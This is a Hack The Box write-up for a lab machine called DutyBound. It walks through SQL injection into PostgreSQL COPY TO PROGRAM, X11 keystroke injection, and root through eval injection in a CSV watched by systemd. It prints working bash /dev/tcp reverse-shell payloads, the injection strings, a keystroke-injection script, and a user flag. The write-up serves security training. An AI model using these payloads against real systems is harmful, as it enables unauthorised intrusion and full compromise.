# DutyBound — Hack The Box Writeup

**Machine:** DutyBound  
**Platform:** Hack The Box  
**OS:** Linux  
**Difficulty:** Medium  
**Creator:** Pho3o  
**Season:** Season 12 (AERO)  
**Release Date:** October 25, 2026  
**Target IP:** 10.129.x.x  
**Attacker IP:** 10.10.x.x  

---

## 1. Reconnaissance

The engagement begins with a standard Nmap scan against the assigned target to identify the exposed attack surface.

```bash
sudo nmap -sC -sV -oN nmap.txt 10.129.x.x
```

The scan reveals three open TCP ports: SSH on 22, HTTP on 80, and HTTPS on 443, all running on Ubuntu with nginx as the web server. The HTTP service on port 80 immediately returns a redirect to `https://airsnacks.htb/`, and the SSL certificate on port 443 confirms the commonName as `airsnacks.htb`. This indicates the server uses name-based virtual hosting, so direct IP access will not yield the intended application.

To resolve the virtual host properly, the domain is added to the local hosts file:

```bash
echo "10.129.x.x airsnacks.htb" | sudo tee -a /etc/hosts
```

After this, browsing to `https://airsnacks.htb` (accepting the self-signed certificate warning) reveals the AirSnacks Self-Checkout kiosk, a Flask-based web application themed around airport duty-free shopping. The main interface allows users to add items to a cart and verify boarding passes at checkout.

Directory fuzzing is performed next to enumerate hidden endpoints:

```bash
feroxbuster -u https://airsnacks.htb -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak
```

The most interesting endpoint discovered is `/checkout/boarding-pass/verify`, which accepts a JSON body containing a `raw` field with a BCBP (Bar Coded Boarding Pass) string. Supporting endpoints include `/cart/add` for adding items and `/checkout/boarding-pass` for initiating the checkout flow.

---

## 2. Initial Foothold — SQL Injection to RCE

The `/checkout/boarding-pass/verify` endpoint parses BCBP-formatted boarding passes and stores audit records in a PostgreSQL database. Submitting a malformed pass produces detailed error messages that reveal the underlying SQL structure:

```bash
curl -k -X POST "https://airsnacks.htb/checkout/boarding-pass/verify" \
  -H "Content-Type: application/json" \
  -d '{"raw": "M1DOE/JOHN..."}'
```

When the BCBP parser encounters an inconsistency, it returns errors like:

```json
{"detail":"trailing data: last-leg item 6 declared 6F, expected 70","error":"BCBP_ERR_ITEM6_MISMATCH","item":6}
```

These verbose errors, combined with the `airline_use` field being inserted into a `bp_scan_audit` table, indicate an error-based SQL injection point. The application also requires an active checkout session, which is established by first adding an item to the cart and then visiting the checkout page. Cookies must be preserved across requests:

```bash
curl -k -c cookies.txt -X POST "https://airsnacks.htb/cart/add" \
  -H "Content-Type: application/json" \
  -d '{"sku": "WAT-CRS-S"}'

curl -k -b cookies.txt "https://airsnacks.htb/checkout"
```

The database role used by the application is a member of `pg_execute_server_program`, which allows the `COPY ... TO PROGRAM` construct to execute operating system commands. A single quote injected into the BCBP payload breaks out of the INSERT statement, and a stacked query invokes the COPY command to spawn a reverse shell.

The payload is saved to a file to avoid shell escaping issues:

```bash
cat << 'EOF' > payload.json
{
  "raw": "M1DOE/JOHN            EABC123 HTBJFKBA 0123 297Y001A0001A16F>50B0WW6297BBA 03123'); COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/10.10.x.x/4444 0>&1\"'; --"
}
EOF
```

A listener is started on the attacker machine:

```bash
nc -lvnp 4444
```

The payload is then submitted with the session cookie:

```bash
curl -k -b cookies.txt -X POST "https://airsnacks.htb/checkout/boarding-pass/verify" \
  -H "Content-Type: application/json" \
  -d @payload.json
```

The server returns a 500 error (expected, since the stacked query does not produce a normal response), but the COPY command has already executed. A connection arrives at the listener, providing an interactive shell as the `postgres` user:

```bash
postgres@dutyfree-kiosk7:/var/lib/postgresql/18/main$ id
uid=114(postgres) gid=120(postgres) groups=120(postgres),119(ssl-cert)
```

The shell is stabilized using Python's pty module:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export DISPLAY=:0
xhost +
```

---

## 3. Lateral Movement — X11 Keystroke Injection

Enumeration of the `postgres` shell reveals that the `dutyfree-kiosk` user runs a graphical Firefox kiosk session on `DISPLAY=:0` using Openbox as the window manager. The X server's access control is disabled (`xhost +` succeeds without authentication), which means any local user can send input events to the kiosk session.

Openbox is configured so that `Ctrl+Alt+T` launches an `xterm` window as the session owner (`dutyfree-kiosk`). The standard tools for X11 keystroke injection (`xte`, `xdotool`) are not installed on the target, but the `python3-xlib` library is available.

A second listener is started on the attacker machine to receive the kiosk shell:

```bash
nc -lvnp 4445
```

From the `postgres` shell, a Python one-liner uses the XTEST extension to simulate the `Ctrl+Alt+T` shortcut:

```bash
python3 -c "
from Xlib import X, XK, display
from Xlib.ext import xtest
import time

d = display.Display()
ctrl = d.keysym_to_keycode(XK.string_to_keysym('Control_L'))
alt = d.keysym_to_keycode(XK.string_to_keysym('Alt_L'))
t = d.keysym_to_keycode(XK.string_to_keysym('t'))

xtest.fake_input(d, X.KeyPress, ctrl)
xtest.fake_input(d, X.KeyPress, alt)
xtest.fake_input(d, X.KeyPress, t)
d.sync()
time.sleep(0.1)

xtest.fake_input(d, X.KeyRelease, t)
xtest.fake_input(d, X.KeyRelease, alt)
xtest.fake_input(d, X.KeyRelease, ctrl)
d.sync()
"
```

A new `xterm` window appears on the kiosk display. A second Python snippet then types the reverse-shell command character-by-character into that window and presses Enter:

```bash
python3 -c "
from Xlib import X, XK, display
from Xlib.ext import xtest
import time

d = display.Display()
text = 'bash -i >& /dev/tcp/10.10.x.x/4445 0>&1'

for char in text:
    keysym = XK.string_to_keysym(char)
    if keysym == 0:
        keysym = ord(char)
    keycode = d.keysym_to_keycode(keysym)
    if keycode:
        xtest.fake_input(d, X.KeyPress, keycode)
        xtest.fake_input(d, X.KeyRelease, keycode)
        d.sync()
        time.sleep(0.05)

ret = d.keysym_to_keycode(XK.string_to_keysym('Return'))
xtest.fake_input(d, X.KeyPress, ret)
xtest.fake_input(d, X.KeyRelease, ret)
d.sync()
"
```

The kiosk's `xterm` executes the command and connects back to the attacker's listener. A shell is obtained as `dutyfree-kiosk`:

```bash
dutyfree-kiosk@dutyfree-kiosk7:~$ id
uid=1000(dutyfree-kiosk) gid=1000(dutyfree-kiosk) groups=1000(dutyfree-kiosk),1001(pos-ops)

dutyfree-kiosk@dutyfree-kiosk7:~$ cat /home/dutyfree-kiosk/user.txt
376c24afe22e1afc502c7ca709a14e38
```

---

## 4. Privilege Escalation — systemd .path + eval Injection

The `dutyfree-kiosk` user belongs to the `pos-ops` group, which has write access to `/opt/vrs/data/`. Listing the directory reveals a CSV file owned by root but writable by the group:

```bash
ls -la /opt/vrs/data/
```

```text
drwxrwxr-x 2 root pos-ops 4096 Oct 20 12:01 .
-rw-rw-r-- 1 root pos-ops   97 Aug 26 14:21 duty-rates.csv
```

The contents of the file follow a simple `CATEGORY,VALUE1,VALUE2` format:

```bash
cat /opt/vrs/data/duty-rates.csv
```

```text
SPIRITS,45,20
WINE,25,20
BEER,25,20
SOFT_DRINKS,20,20
SNACKS,20,20
CONFECTIONERY,20,20
WATER,0,0
```

A systemd `.path` unit watches this file and triggers a root-owned oneshot service whenever it changes. The service script reads each line of the CSV and evaluates it using an unsafe bash construct:

```bash
eval "${tax_class}=${duty_pct}"
```

Because `tax_class` is not sanitized, arbitrary command injection is possible through backticks or `$(...)` substitution.

A third listener is started on the attacker machine to receive the root shell:

```bash
nc -lvnp 4446
```

A new line is appended to the CSV file, placing a reverse-shell payload in the first field where `tax_class` would normally appear:

```bash
echo '`bash -i >& /dev/tcp/10.10.x.x/4446 0>&1`,45,20' >> /opt/vrs/data/duty-rates.csv
touch /opt/vrs/data/duty-rates.csv
```

The `.path` unit detects the modification and the root service executes. The `eval` expands the backticks, spawning a reverse shell as root:

```bash
# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/root.txt
<ROOT_FLAG_REDACTED>
```

---

## 5. Summary

The DutyBound machine chains together several classic techniques into a cohesive engagement flow. Initial access is gained through an error-based SQL injection in a BCBP boarding-pass parser, escalated to OS command execution via PostgreSQL's `COPY TO PROGRAM` feature. Lateral movement to the kiosk user is achieved by abusing an X11 session with disabled access control, using the XTEST extension to inject keystrokes that open a terminal and execute a reverse shell. Final privilege escalation exploits a systemd path-activated service that evaluates unsanitized CSV content as bash, allowing command injection through the first field of an appended row.

Key lessons reinforced by this lab:
- Verbose database errors can expose injection points even when the application logic appears strict.
- PostgreSQL's `COPY TO PROGRAM` is a powerful RCE vector when the database role has the `pg_execute_server_program` membership.
- Disabling X11 access control on a multi-user system effectively grants any local user the ability to drive another user's graphical session.
- Systemd `.path` units paired with writable configuration files create a reliable privilege-escalation path when the triggered service processes input unsafely.
- The `eval` construct in shell scripts must never be applied to untrusted data.

---
**Happy Hacking.**
